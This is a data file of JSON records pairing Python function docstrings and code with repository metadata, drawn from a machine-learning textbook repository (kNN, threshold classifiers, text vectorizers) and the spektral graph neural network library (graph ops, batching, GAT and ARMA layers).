{"docstring": "'''Movie neighbor based classifier\n\nParameters\n----------\nureviews : ndarray\nreviews : ndarray\nuid : int\n    index of user\nmid : int\n    index of movie\nk : int\n    index of neighbor to return\n\nReturns\n-------\npred : float\n'''\n", "func_signal": "def nn_movie(ureviews, reviews, uid, mid, k=1):\n", "code": "X = ureviews\ny = ureviews[mid].copy()\ny -= y.mean()\ny /= (y.std() + 1e-5)\ncorrs = np.dot(X, y)\nlikes = corrs.argsort()\nlikes = likes[::-1]\nc = 0\npred = 3.\nfor ell in likes:\n    if ell == mid:\n        continue\n    if reviews[uid, ell] > 0:\n        pred = reviews[uid, ell]\n        if c == k:\n            return pred\n        c += 1\nreturn pred", "path": "BuildingMachineLearningSystemsWithPython/ch08/similar_movie.py", "commit_date": "2014-08-21 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Compute the accuracy of the model'''\n", "func_signal": "def accuracy(features, labels, model):\n", "code": "preds = predict(model, features)\nreturn np.mean(preds == labels)", "path": "BuildingMachineLearningSystemsWithPython/ch02/threshold.py", "commit_date": "2015-01-26 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Decode the input into a string of unicode symbols\n\nThe decoding strategy depends on the vectorizer parameters.\n\"\"\"\n", "func_signal": "def decode(self, doc):\n", "code": "if self.input == 'filename':\n    doc = open(doc, 'rb').read()\n\nelif self.input == 'file':\n    doc = doc.read()\n\nif isinstance(doc, bytes):\n    doc = doc.decode(self.charset, self.charset_error)\nreturn doc", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Compute cross-validation errors'''\n", "func_signal": "def cross_validate(features, labels):\n", "code": "error = 0.0\nfor fold in range(10):\n    training = np.ones(len(features), bool)\n    training[fold::10] = 0\n    testing = ~training\n    model = fit_model(1, features[training], labels[training])\n    test_error = accuracy(features[testing], labels[testing], model)\n    error += test_error\n\nreturn error / 10.0", "path": "BuildingMachineLearningSystemsWithPython/ch02/seeds_knn.py", "commit_date": "2014-07-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Measure the \"edginess\" of an image\n\nimage should be a 2d numpy array (an image)\n\nReturns a floating point value which is higher the \"edgier\" the image is.\n\n'''\n", "func_signal": "def edginess_sobel(image):\n", "code": "edges = mh.sobel(image, just_filter=True)\nedges = edges.ravel()\nreturn np.sqrt(np.dot(edges, edges))", "path": "BuildingMachineLearningSystemsWithPython/ch10/features.py", "commit_date": "2015-03-20 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Learn a simple threshold model'''\n", "func_signal": "def fit_model(features, labels):\n", "code": "best_acc = -1.0\n# Loop over all the features:\nfor fi in range(features.shape[1]):\n    thresh = features[:, fi].copy()\n    # test all feature values in order:\n    thresh.sort()\n    for t in thresh:\n        pred = (features[:, fi] > t)\n\n        # Measure the accuracy of this \n        acc = (pred == labels).mean()\n\n        rev_acc = (pred == ~labels).mean()\n        if rev_acc > acc:\n            acc = rev_acc\n            reverse = True\n        else:\n            reverse = False\n        if acc > best_acc:\n            best_acc = acc\n            best_fi = fi\n            best_t = t\n            best_reverse = reverse\n\n# A model is a threshold and an index\nreturn best_t, best_fi, best_reverse", "path": "BuildingMachineLearningSystemsWithPython/ch02/threshold.py", "commit_date": "2015-01-26 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Estimate all review ratings\n'''\n", "func_signal": "def all_estimates(reviews, k=1):\n", "code": "reviews = reviews.astype(float)\nk -= 1\nnusers, nmovies = reviews.shape\nestimates = np.zeros_like(reviews)\nfor u in range(nusers):\n    ureviews = np.delete(reviews, u, axis=0)\n    ureviews -= ureviews.mean(0)\n    ureviews /= (ureviews.std(0) + 1e-5)\n    ureviews = ureviews.T.copy()\n    for m in np.where(reviews[u] > 0)[0]:\n        estimates[u, m] = nn_movie(ureviews, reviews, u, m, k)\nreturn estimates", "path": "BuildingMachineLearningSystemsWithPython/ch08/similar_movie.py", "commit_date": "2014-08-21 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Return a callable that handles preprocessing and tokenization\"\"\"\n\n", "func_signal": "def build_analyzer(self):\n", "code": "preprocess = self.build_preprocessor()\n\ntokenize = self.build_tokenizer()\n\nreturn lambda doc: tokenize(preprocess(self.decode(doc)))", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Array mapping from feature integer indices to feature name\"\"\"\n", "func_signal": "def get_feature_names(self):\n", "code": "if not hasattr(self, 'vocabulary_') or len(self.vocabulary_) == 0:\n    raise ValueError(\"Vocabulary wasn't fitted or is empty!\")\n\nreturn [t for t, i in sorted(iter(self.vocabulary_.items()),\n                             key=itemgetter(1))]", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Extract token counts out of raw text documents using the vocabulary\nfitted with fit or the one provided in the constructor.\n\nParameters\n----------\nraw_documents: iterable\n    an iterable which yields either str, unicode or file objects\n\nReturns\n-------\nvectors: sparse matrix, [n_samples, n_features]\n\"\"\"\n", "func_signal": "def transform(self, raw_documents):\n", "code": "if not hasattr(self, 'vocabulary_') or len(self.vocabulary_) == 0:\n    raise ValueError(\"Vocabulary wasn't fitted or is empty!\")\n\n# raw_documents can be an iterable so we don't know its size in\n# advance\n\n# XXX @larsmans tried to parallelize the following loop with joblib.\n# The result was some 20% slower than the serial version.\nanalyze = self.build_analyzer()\nterm_counts_per_doc = [Counter(analyze(doc)) for doc in raw_documents]\nreturn self._term_count_dicts_to_matrix(term_counts_per_doc)", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Plots decision boundary for KNN\n\nParameters\n----------\nfeatures : ndarray\nlabels : sequence\n\nReturns\n-------\nfig : Matplotlib Figure\nax  : Matplotlib Axes\n'''\n", "func_signal": "def plot_decision(features, labels, num_neighbors=1):\n", "code": "y0, y1 = features[:, 2].min() * .9, features[:, 2].max() * 1.1\nx0, x1 = features[:, 0].min() * .9, features[:, 0].max() * 1.1\nX = np.linspace(x0, x1, 1000)\nY = np.linspace(y0, y1, 1000)\nX, Y = np.meshgrid(X, Y)\n\nmodel = KNeighborsClassifier(num_neighbors)\nmodel.fit(features[:, (0,2)], labels)\nC = model.predict(np.vstack([X.ravel(), Y.ravel()]).T).reshape(X.shape)\nif COLOUR_FIGURE:\n    cmap = ListedColormap([(1., .7, .7), (.7, 1., .7), (.7, .7, 1.)])\nelse:\n    cmap = ListedColormap([(1., 1., 1.), (.2, .2, .2), (.6, .6, .6)])\nfig,ax = plt.subplots()\nax.set_xlim(x0, x1)\nax.set_ylim(y0, y1)\nax.set_xlabel(feature_names[0])\nax.set_ylabel(feature_names[2])\nax.pcolormesh(X, Y, C, cmap=cmap)\nif COLOUR_FIGURE:\n    cmap = ListedColormap([(1., .0, .0), (.1, .6, .1), (.0, .0, 1.)])\n    ax.scatter(features[:, 0], features[:, 2], c=labels, cmap=cmap)\nelse:\n    for lab, ma in zip(range(3), \"Do^\"):\n        ax.plot(features[labels == lab, 0], features[\n                 labels == lab, 2], ma, c=(1., 1., 1.), ms=6)\nreturn fig,ax", "path": "BuildingMachineLearningSystemsWithPython/ch02/figure4_5_sklearn.py", "commit_date": "2015-01-26 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"\nGiven a jagged array of arbitrary dimensions, zero-pads all elements in the\narray to match the provided `target_shape`.\n:param x: a list or np.array of dtype object, containing np.arrays with\nvariable dimensions;\n:param target_shape: a tuple or list s.t. target_shape[i] >= x.shape[i]\nfor each x in X. If `target_shape[i] = -1`, it will be automatically\nconverted to X.shape[i], so that passing a target shape of e.g. (-1, n, m)\nwill leave the first  dimension of each element untouched.\n:return: a np.array of shape `(len(x), ) + target_shape`.\n\"\"\"\n", "func_signal": "def pad_jagged_array(x, target_shape):\n", "code": "if len(x) < 1:\n    raise ValueError(\"Jagged array cannot be empty\")\ntarget_len = len(x)\ntarget_shape = tuple(\n    shp if shp != -1 else x[0].shape[j] for j, shp in enumerate(target_shape)\n)\noutput = np.zeros((target_len,) + target_shape, dtype=x[0].dtype)\nfor i in range(target_len):\n    slc = (i,) + tuple(slice(shp) for shp in x[i].shape)\n    output[slc] = x[i]\n\nreturn output", "path": "spektral/spektral/utils/misc.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nComputes symmetric normalization of A, dealing with sparse A and batch mode\nautomatically.\n:param A: Tensor or SparseTensor with rank k = {2, 3}.\n:return: Tensor or SparseTensor of rank k.\n\"\"\"\n", "func_signal": "def normalize_A(A):\n", "code": "D = degrees(A)\nD = tf.sqrt(D)[:, None] + K.epsilon()\nperm = (0, 2, 1) if K.ndim(A) == 3 else (1, 0)\noutput = (A / D) / ops.transpose(D, perm=perm)\n\nreturn output", "path": "spektral/spektral/layers/ops/graph.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nIterates over the data for the given number of epochs, yielding batches of\nsize `batch_size`.\n:param data: np.array or list of np.arrays with the same first dimension;\n:param batch_size: number of samples in a batch;\n:param epochs: number of times to iterate over the data;\n:param shuffle: whether to shuffle the data at the beginning of each epoch\n:return: batches of size `batch_size`.\n\"\"\"\n", "func_signal": "def batch_generator(data, batch_size=32, epochs=None, shuffle=True):\n", "code": "if not isinstance(data, (list, tuple)):\n    data = [data]\nif len(data) < 1:\n    raise ValueError(\"data cannot be empty\")\nif len(set([len(item) for item in data])) > 1:\n    raise ValueError(\"All inputs must have the same __len__\")\n\nif epochs is None or epochs == -1:\n    epochs = np.inf\nlen_data = len(data[0])\nbatches_per_epoch = int(np.ceil(len_data / batch_size))\nepoch = 0\nwhile epoch < epochs:\n    epoch += 1\n    if shuffle:\n        shuffle_inplace(*data)\n    for batch in range(batches_per_epoch):\n        start = batch * batch_size\n        stop = min(start + batch_size, len_data)\n        to_yield = [item[start:stop] for item in data]\n        if len(data) == 1:\n            to_yield = to_yield[0]\n\n        yield to_yield", "path": "spektral/spektral/data/utils.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nThis property computes the signature of the dataset, which can be\npassed to `spektral.data.utils.to_tf_signature(signature)` to compute\nthe TensorFlow signature. You can safely ignore this property unless\nyou are creating a custom `Loader`.\n\nA signature consist of the TensorFlow TypeSpec, shape, and dtype of\nall characteristic matrices of the graphs in the Dataset. This is\nreturned as a dictionary of dictionaries, with keys `x`, `a`, `e`, and\n`y` for the four main data matrices.\n\nEach sub-dictionary will have keys `spec`, `shape` and `dtype`.\n\"\"\"\n", "func_signal": "def signature(self):\n", "code": "signature = {}\ngraph = self.graphs[0]  # This is always non-empty\nif graph.x is not None:\n    signature[\"x\"] = dict()\n    signature[\"x\"][\"spec\"] = get_spec(graph.x)\n    signature[\"x\"][\"shape\"] = (None, self.n_node_features)\n    signature[\"x\"][\"dtype\"] = tf.as_dtype(graph.x.dtype)\nif graph.a is not None:\n    signature[\"a\"] = dict()\n    signature[\"a\"][\"spec\"] = get_spec(graph.a)\n    signature[\"a\"][\"shape\"] = (None, None)\n    signature[\"a\"][\"dtype\"] = tf.as_dtype(graph.a.dtype)\nif graph.e is not None:\n    signature[\"e\"] = dict()\n    signature[\"e\"][\"spec\"] = get_spec(graph.e)\n    signature[\"e\"][\"shape\"] = (None, self.n_edge_features)\n    signature[\"e\"][\"dtype\"] = tf.as_dtype(graph.e.dtype)\nif graph.y is not None:\n    signature[\"y\"] = dict()\n    signature[\"y\"][\"spec\"] = get_spec(graph.y)\n    signature[\"y\"][\"shape\"] = (self.n_labels,)\n    signature[\"y\"][\"dtype\"] = tf.as_dtype(np.array(graph.y).dtype)\nreturn signature", "path": "spektral/spektral/data/dataset.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nTransposes a according to perm, dealing automatically with sparsity.\n:param a: Tensor or SparseTensor with rank k.\n:param perm: permutation indices of size k.\n:param name: name for the operation.\n:return: Tensor or SparseTensor with rank k.\n\"\"\"\n", "func_signal": "def transpose(a, perm=None, name=None):\n", "code": "if K.is_sparse(a):\n    transpose_op = tf.sparse.transpose\nelse:\n    transpose_op = tf.transpose\n\nif perm is None:\n    perm = (1, 0)  # Make explicit so that shape will always be preserved\nreturn transpose_op(a, perm=perm, name=name)", "path": "spektral/spektral/layers/ops/ops.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nOne-hot encodes the integer array `x` in an array of length `depth`.\n:param x: a np.array of integers.\n:param depth: size of the one-hot vectors.\n:return: an array of shape `x.shape + (depth, )`\n\"\"\"\n", "func_signal": "def one_hot(x, depth):\n", "code": "x = np.array(x).astype(int)\nout = np.eye(depth)[x]\n\nreturn out", "path": "spektral/spektral/utils/misc.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nReturn mask with true values at indices of the given shape.\nThis can be used as an inverse to tf.where.\n:param indices: [nnz, k] or [nnz] Tensor indices of True values.\n:param shape: [k] or [] (scalar) Tensor shape/size of output.\n:return: Tensor of given shape and dtype.\n\"\"\"\n", "func_signal": "def indices_to_mask(indices, shape, dtype=tf.bool):\n", "code": "indices = tf.convert_to_tensor(indices, dtype_hint=tf.int64)\nif indices.shape.ndims == 1:\n    assert isinstance(shape, int) or shape.shape.ndims == 0\n    indices = tf.expand_dims(indices, axis=1)\n    if isinstance(shape, int):\n        shape = tf.TensorShape([shape])\n    else:\n        shape = tf.expand_dims(shape, axis=0)\nelse:\n    indices.shape.assert_has_rank(2)\nassert indices.dtype.is_integer\nnnz = tf.shape(indices)[0]\nindices = tf.cast(indices, tf.int64)\nshape = tf.cast(shape, tf.int64)\nreturn tf.scatter_nd(indices, tf.ones((nnz,), dtype=dtype), shape)", "path": "spektral/spektral/layers/ops/ops.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "# Reshape kernels for efficient message-passing\n", "func_signal": "def _call_single(self, x, a):\n", "code": "kernel = tf.reshape(self.kernel, (-1, self.attn_heads * self.channels))\nattn_kernel_self = ops.transpose(self.attn_kernel_self, (2, 1, 0))\nattn_kernel_neighs = ops.transpose(self.attn_kernel_neighs, (2, 1, 0))\n\n# Prepare message-passing\nindices = a.indices\nN = tf.shape(x, out_type=indices.dtype)[0]\nindices = ops.add_self_loops_indices(indices, N)\ntargets, sources = indices[:, -2], indices[:, -1]\n\n# Update node features\nx = ops.dot(x, kernel)\nx = tf.reshape(x, (-1, self.attn_heads, self.channels))\n\n# Compute attention\nattn_for_self = tf.reduce_sum(x * attn_kernel_self, -1)\nattn_for_self = tf.gather(attn_for_self, targets)\nattn_for_neighs = tf.reduce_sum(x * attn_kernel_neighs, -1)\nattn_for_neighs = tf.gather(attn_for_neighs, sources)\n\nattn_coef = attn_for_self + attn_for_neighs\nattn_coef = tf.nn.leaky_relu(attn_coef, alpha=0.2)\nattn_coef = ops.unsorted_segment_softmax(attn_coef, targets, N)\nattn_coef = self.dropout(attn_coef)\nattn_coef = attn_coef[..., None]\n\n# Update representation\noutput = attn_coef * tf.gather(x, sources)\noutput = ops.scatter_sum(output, targets, N)\n\nreturn output, attn_coef", "path": "spektral/spektral/layers/convolutional/gat_conv.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nCreates a set of weights for a GCN with skip connections.\n:param input_dim: dimension of the input space\n:param input_dim_skip: dimension of the input space for the skip connection\n:param channels: dimension of the output space\n:param name: name of the layer\n:return:\n    - kernel_1, from input space of the layer to output space\n    - kernel_2, from input space of the skip connection to output space\n    - bias, bias vector on the output space if use_bias=True, None otherwise.\n\"\"\"\n", "func_signal": "def create_weights(self, input_dim, input_dim_skip, channels, name):\n", "code": "kernel_1 = self.add_weight(\n    shape=(input_dim, channels),\n    name=name + \"_kernel_1\",\n    initializer=self.kernel_initializer,\n    regularizer=self.kernel_regularizer,\n    constraint=self.kernel_constraint,\n)\nkernel_2 = self.add_weight(\n    shape=(input_dim_skip, channels),\n    name=name + \"_kernel_2\",\n    initializer=self.kernel_initializer,\n    regularizer=self.kernel_regularizer,\n    constraint=self.kernel_constraint,\n)\nif self.use_bias:\n    bias = self.add_weight(\n        shape=(channels,),\n        name=name + \"_bias\",\n        initializer=self.bias_initializer,\n        regularizer=self.bias_regularizer,\n        constraint=self.bias_constraint,\n    )\nelse:\n    bias = None\nreturn kernel_1, kernel_2, bias", "path": "spektral/spektral/layers/convolutional/arma_conv.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nPerforms a depth-first visit of an arbitrarily nested list and yields its\nelement in order.\n:param alist: a list or np.array (with at least one dimension),\n              arbitrarily nested.\n\"\"\"\n", "func_signal": "def _flatten_list_gen(alist):\n", "code": "for item in alist:\n    if isinstance(item, (list, tuple, np.ndarray)):\n        for i in _flatten_list_gen(item):\n            yield i\n    else:\n        yield item", "path": "spektral/spektral/utils/misc.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nGiven a batch of graphs, groups their attributes into separate lists.\n\nFor instance, if a batch has three graphs g1, g2 and g3 with node\nfeatures (x1, x2, x3) and adjacency matrices (a1, a2, a3), this method\nwill return:\n\n```\na_list = [a1, a2, a3]\nx_list = [x1, x2, x3]\n```\n\nIf `return_dict=True`, the lists are wrapped in a dictionary:\n\n```\n{'a_list': [a1, a2, a3],\n 'x_list': [x1, x2, x3]}\n```\n\n this is useful for passing the packed batch to `data.utils.to_batch()`\n and `data.utils.to_disjoint()` without knowing a-priori what are the\n attributes of the graphs.\n\n:param batch: a list of Graphs\n:param return_dict: whether to return the lists as element of a dictionary.\n:return: the batch packed into lists, by attribute type.\n\"\"\"\n", "func_signal": "def pack(self, batch, return_dict=False):\n", "code": "output = [list(elem) for elem in zip(*[g.numpy() for g in batch])]\nif return_dict:\n    keys = [k + \"_list\" for k in self.dataset.signature.keys()]\n    return {k: v for k, v in zip(keys, output)}\nelse:\n    return output", "path": "spektral/spektral/data/loaders.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nReturns indices to get the top K values in x segment-wise, according to\nthe segments defined in I. K is not fixed, but it is defined as a ratio of\nthe number of elements in each segment.\n:param x: a rank 1 Tensor;\n:param I: a rank 1 Tensor with segment IDs for x;\n:param ratio: float, ratio of elements to keep for each segment;\n:return: a rank 1 Tensor containing the indices to get the top K values of\neach segment in x.\n\"\"\"\n", "func_signal": "def segment_top_k(x, I, ratio):\n", "code": "rt = tf.RaggedTensor.from_value_rowids(x, I)\nrow_lengths = rt.row_lengths()\ndense = rt.to_tensor(default_value=-np.inf)\nindices = tf.cast(tf.argsort(dense, direction='DESCENDING'), tf.int64)\nrow_starts = tf.cast(rt.row_starts(), tf.int64)\nindices = indices + tf.expand_dims(row_starts, 1)\nrow_lengths = tf.cast(\n    tf.math.ceil(ratio * tf.cast(row_lengths, tf.float32)), tf.int32)\nreturn tf.RaggedTensor.from_tensor(indices, row_lengths).values", "path": "spektral/spektral/layers/ops/ops.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nOne-hot encodes the integer array `x` according to the given `labels`.\n\n:param x: a np.array of integers. Each value must be contained in `labels`.\n:param labels: list/tuple/np.array of labels.\n:return: an array of shape `x.shape + (len(labels), )`\n\"\"\"\n", "func_signal": "def label_to_one_hot(x, labels):\n", "code": "if not isinstance(labels, (list, tuple, np.ndarray)):\n    raise ValueError(\"labels must be list, tuple, or np.ndarray\")\nif not np.all(np.in1d(x, labels)):\n    raise ValueError(\"All values in x must be contained in labels\")\ndepth = len(labels)\nx = np.array(x).astype(int)\nout = x.copy()\nfor i, label in enumerate(labels):\n    out[x == label] = i\n\nreturn one_hot(out, depth)", "path": "spektral/spektral/utils/misc.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nCreates a graph convolutional layer with a skip connection.\n:param inputs: list of input Tensors, namely\n    - input node features\n    - input node features for the skip connection\n    - normalized adjacency matrix;\n:param stack: int, current stack (used to retrieve kernels);\n:param iteration: int, current iteration (used to retrieve kernels);\n:return: output node features.\n\"\"\"\n", "func_signal": "def gcs(self, inputs, stack, iteration):\n", "code": "x, x_skip, a = inputs\n\niter = 1 if self.share_weights and iteration >= 1 else iteration\nkernel_1, kernel_2, bias = self.kernels[stack][iter]\n\noutput = K.dot(x, kernel_1)\noutput = ops.filter_dot(a, output)\n\nskip = K.dot(x_skip, kernel_2)\nskip = Dropout(self.dropout_rate)(skip)\noutput += skip\n\nif self.use_bias:\n    output = K.bias_add(output, bias)\noutput = self.gcn_activation(output)\n\nreturn output", "path": "spektral/spektral/layers/convolutional/arma_conv.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nConverts a Dataset signature to a TensorFlow signature.\n:param signature: a Dataset signature.\n:return: a TensorFlow signature.\n\"\"\"\n", "func_signal": "def to_tf_signature(signature):\n", "code": "output = []\nkeys = [\"x\", \"a\", \"e\", \"i\"]\nfor k in keys:\n    if k in signature:\n        shape = signature[k][\"shape\"]\n        dtype = signature[k][\"dtype\"]\n        spec = signature[k][\"spec\"]\n        output.append(spec(shape, dtype))\noutput = tuple(output)\nif \"y\" in signature:\n    shape = signature[\"y\"][\"shape\"]\n    dtype = signature[\"y\"][\"dtype\"]\n    spec = signature[\"y\"][\"spec\"]\n    output = (output, spec(shape, dtype))\n\nreturn output", "path": "spektral/spektral/data/utils.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "# Read extra kwargs\n", "func_signal": "def __init__(self, transforms=None, **kwargs):\n", "code": "        for k, v in kwargs.items():\n            setattr(self, k, v)\n# Download data\n        if not osp.exists(self.path):\n            self.download()\n# Read graphs\n        self.graphs = self.read()\n        if len(self.graphs) == 0:\n            raise ValueError(\"Datasets cannot be empty\")\n# Apply transforms\n        if transforms is not None:\n            if not isinstance(transforms, (list, tuple)) and callable(transforms):\n                transforms = [transforms]\n            elif not all([callable(t) for t in transforms]):\n                raise ValueError(\n                    \"`transforms` must be a callable or list of \" \"callables\"\n                )\n            else:\n                pass\n            for t in transforms:\n                self.apply(t)", "path": "spektral/spektral/data/dataset.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nConverts lists of node features, adjacency matrices and (optionally) edge\nfeatures to [batch mode](https://danielegrattarola.github.io/spektral/data/#batch-mode),\nby zero-padding all tensors to have the same node dimension `n_max`.\n\nEither the node features or the adjacency matrices must be provided as input.\n\nThe i-th element of each list must be associated with the i-th graph.\n\nIf `a_list` contains sparse matrices, they will be converted to dense\nnp.arrays, which can be expensive.\n\nThe edge attributes of a graph can be represented as\n\n- a dense array of shape `(n_nodes, n_nodes, n_edge_features)`;\n- a sparse edge list of shape `(n_edges, n_edge_features)`;\n\nand they will always be returned as dense arrays.\n\n:param x_list: a list of np.arrays of shape `(n_nodes, n_node_features)`\n-- note that `n_nodes` can change between graphs;\n:param a_list: a list of np.arrays or scipy.sparse matrices of shape\n`(n_nodes, n_nodes)`;\n:param e_list: a list of np.arrays of shape\n`(n_nodes, n_nodes, n_edge_features)` or `(n_edges, n_edge_features)`;\n:return: only if the corresponding list is given as input:\n\n    -  `x`: np.array of shape `(batch, n_max, n_node_features)`;\n    -  `a`: np.array of shape `(batch, n_max, n_max)`;\n    -  `e`: np.array of shape `(batch, n_max, n_max, n_edge_features)`;\n\"\"\"\n", "func_signal": "def to_batch(x_list=None, a_list=None, e_list=None):\n", "code": "if a_list is None and x_list is None:\n    raise ValueError(\"Need at least x_list or a_list\")\n\nn_max = max([x.shape[0] for x in (x_list if x_list is not None else a_list)])\n\n# Node features\nx_out = None\nif x_list is not None:\n    x_out = pad_jagged_array(x_list, (n_max, -1))\n\n# Adjacency matrix\na_out = None\nif a_list is not None:\n    if hasattr(a_list[0], \"toarray\"):  # Convert sparse to dense\n        a_list = [a.toarray() for a in a_list]\n    a_out = pad_jagged_array(a_list, (n_max, n_max))\n\n# Edge attributes\ne_out = None\nif e_list is not None:\n    if e_list[0].ndim == 2:  # Sparse to dense\n        for i in range(len(a_list)):\n            a, e = a_list[i], e_list[i]\n            e_new = np.zeros(a.shape + e.shape[-1:])\n            e_new[np.nonzero(a)] = e\n            e_list[i] = e_new\n    e_out = pad_jagged_array(e_list, (n_max, n_max, -1))\n\nreturn tuple(out for out in [x_out, a_out, e_out] if out is not None)", "path": "spektral/spektral/data/utils.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nReshapes a according to shape, dealing automatically with sparsity.\n:param a: Tensor or SparseTensor.\n:param shape: new shape.\n:param name: name for the operation.\n:return: Tensor or SparseTensor.\n\"\"\"\n", "func_signal": "def reshape(a, shape=None, name=None):\n", "code": "if K.is_sparse(a):\n    reshape_op = tf.sparse.reshape\nelse:\n    reshape_op = tf.reshape\n\nreturn reshape_op(a, shape=shape, name=name)", "path": "spektral/spektral/layers/ops/ops.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nComputes the degrees of each node in A, dealing with sparse A and batch mode\nautomatically.\n:param A: Tensor or SparseTensor with rank k = {2, 3}.\n:return: Tensor or SparseTensor of rank k - 1.\n\"\"\"\n", "func_signal": "def degrees(A):\n", "code": "if K.is_sparse(A):\n    D = tf.sparse.reduce_sum(A, axis=-1)\nelse:\n    D = tf.reduce_sum(A, axis=-1)\n\nreturn D", "path": "spektral/spektral/layers/ops/graph.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
{"docstring": "\"\"\"\nComputes the degree matrix of A, deals with sparse A and batch mode\nautomatically.\n:param A: Tensor or SparseTensor with rank k = {2, 3}.\n:param return_sparse_batch: if operating in batch mode, return a\nSparseTensor. Note that the sparse degree Tensor returned by this function\ncannot be used for sparse matrix multiplication afterwards.\n:return: SparseTensor of rank k.\n\"\"\"\n", "func_signal": "def degree_matrix(A, return_sparse_batch=False):\n", "code": "D = degrees(A)\n\nbatch_mode = K.ndim(D) == 2\nN = tf.shape(D)[-1]\nbatch_size = tf.shape(D)[0] if batch_mode else 1\n\ninner_index = tf.tile(tf.stack([tf.range(N)] * 2, axis=1), (batch_size, 1))\nif batch_mode:\n    if return_sparse_batch:\n        outer_index = ops.repeat(\n            tf.range(batch_size), tf.ones(batch_size) * tf.cast(N, tf.float32)\n        )\n        indices = tf.concat([outer_index[:, None], inner_index], 1)\n        dense_shape = (batch_size, N, N)\n    else:\n        return tf.linalg.diag(D)\nelse:\n    indices = inner_index\n    dense_shape = (N, N)\n\nindices = tf.cast(indices, tf.int64)\nvalues = tf.reshape(D, (-1,))\nreturn tf.SparseTensor(indices, values, dense_shape)", "path": "spektral/spektral/layers/ops/graph.py", "commit_date": "2020-05-26 00:00:00", "repo_name": "danielegrattarola/spektral", "stars": 2331, "license": "mit", "language": "python", "size": 13458}
